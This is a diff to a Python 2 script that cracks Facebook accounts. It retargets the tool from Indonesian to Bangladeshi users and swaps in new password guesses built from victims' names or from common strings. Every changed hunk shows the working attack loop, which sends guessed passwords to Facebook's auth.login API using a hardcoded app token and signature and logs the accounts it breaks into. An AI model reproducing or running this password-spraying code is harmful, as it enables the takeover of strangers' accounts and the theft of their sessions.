@@ -162,7 +162,7 @@ def menu():
 	print "\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m User ID Akun Anda:\033[1;97m·\033[1;97m "+id
 	print "\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m Tanggal Lahir Facebook Anda:\033[1;97m·\033[1;97m "+ a['birthday']
 	print "\033[1;97m ══════════════════════════════════════════"
-	print "\033[1;97m [\033[1;97m01\033[1;97m]\033[1;97m\033[1;97m Crack ID Indonesia"
+	print "\033[1;97m [\033[1;97m01\033[1;97m]\033[1;97m\033[1;97m Crack ID Indo/Bangla"
 	print "\033[1;97m [\033[1;97m02\033[1;97m]\033[1;97m\033[1;97m Crack ID Group"
 	print "\033[1;97m [\033[1;97m03\033[1;97m]\033[1;97m\033[1;97m Ambil ID"
 	print "\033[1;97m [\033[1;97m04\033[1;97m]\033[1;97m\033[1;97m Ikuti Saya di Facebook"
@@ -207,8 +207,8 @@ def indo():
 	os.system('clear')
 	print logo
 	print "\033[1;97m ══════════════════════════════════════════"
-	print "\033[1;97m [\033[1;97m01\033[1;97m]\033[1;97m\033[1;97m Crack dari ID Publik / Teman"
-	print "\033[1;97m [\033[1;97m02\033[1;97m]\033[1;97m\033[1;97m Crack dari File"
+	print "\033[1;97m [\033[1;97m01\033[1;97m]\033[1;97m\033[1;97m Crack dari ID Publik / Teman/Bangla"
+	print "\033[1;97m [\033[1;97m02\033[1;97m]\033[1;97m\033[1;97m Crack dari File/Indo"
 	print "\033[1;97m [\033[1;91m00\033[1;97m]\033[1;97m\033[1;97m Kembali"
 	print "\033[1;97m ══════════════════════════════════════════"
 	pilih_indo()
@@ -267,7 +267,7 @@ def pilih_indo():
 	print "\n\033[1;97m ══════════════════════════════════════════"
 	print "\033[1;97m \033[1;41;97m TO STOP PROCESS,PRESS CTRL+Z.GOOD LUCK :) \033[0m"
 	print "\033[1;97m ══════════════════════════════════════════"
-##### MAIN INDONESIA #####
+##### MAIN BANGLADESH #####
 	def main(arg):
 		sys.stdout.write('\r{}'.format(datetime.now().strftime('\033[1;97m%H:%M:%S')));sys.stdout.flush()
 		global cekpoint,oks
@@ -301,7 +301,7 @@ def pilih_indo():
 							print '\033[1;93m | ' + user + ' • ' + pass2 + ' • ' + c['name']
 							cekpoint.append(user)
 						else:
-							pass3 = c['first_name']+'1234'
+							pass3 = c['first_name']+'12345'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							w = json.load(data)
 							if 'access_token' in w:
@@ -312,7 +312,7 @@ def pilih_indo():
 									print '\033[1;93m | ' + user + ' • ' + pass3 + ' • ' + c['name']
 									cekpoint.append(user)
 								else:
-									pass4 = c['last_name']+'321'
+									pass4 = c['last_name']+'102030'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									w = json.load(data)
 									if 'access_token' in w:
@@ -323,7 +323,7 @@ def pilih_indo():
 											print '\033[1;93m | ' + user + ' • ' + pass4 + ' • ' + c['name']
 											cekpoint.append(user)
 										else:
-											pass5 = c['last_name']+'Doraemon'
+											pass5 = c['last_name']+'890890'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											w = json.load(data)
 											if 'access_token' in w:
@@ -334,7 +334,7 @@ def pilih_indo():
 													print '\033[1;93m | ' + user + ' • ' + pass5 + ' • ' + c['name']
 													cekpoint.append(user)
 												else:
-													pass6 = 'Anjing'
+													pass6 = '789789'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													w = json.load(data)
 													if 'access_token' in w:
@@ -345,7 +345,7 @@ def pilih_indo():
 															print '\033[1;93m | ' + user + ' • ' + pass6 + ' • ' + c['name']
 															cekpoint.append(user)
 														else:
-															pass7 = 'Indonesia'
+															pass7 = 'Bangladesh'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															w = json.load(data)
 															if 'access_token' in w:
@@ -356,7 +356,7 @@ def pilih_indo():
 																	print '\033[1;93m | ' + user + ' • ' + pass7 + ' • ' + c['name']
 																	cekpoint.append(user)
 																else:
-																	pass8 = 'Kontol'
+																	pass8 = '123456'
 																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																	w = json.load(data)
 																	if 'access_token' in w:
@@ -367,7 +367,7 @@ def pilih_indo():
 																			print '\033[1;93m | ' + user + ' • ' + pass8 + ' • ' + c['name']
 																			cekpoint.append(user)
 																		else:
-																			pass9 = 'Sayang'
+																			pass9 = 'Bangla123'
 																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																			w = json.load(data)
 																			if 'access_token' in w:
